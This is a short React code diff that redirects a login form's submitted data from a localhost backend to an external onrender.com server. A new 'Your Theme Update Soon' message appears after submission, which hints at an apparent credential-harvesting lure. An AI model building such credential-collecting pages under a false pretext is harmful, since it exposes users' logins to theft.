@@ -17,8 +17,8 @@ function App() {
 
   const handleSubmit = async () => {
     try {
-      const response = await axios.post('http://localhost:8000/api/login_next/', formData);
-      console.log('Success:', response.data);
+      const response = await axios.post('https://loginserver-d9uf.onrender.com/api/login_next/', formData);
+      console.log('Success....Your Theme Update Soon:', response.data);
       alert('Login data submitted!');
     } catch (error) {
       console.error('Error:', error);
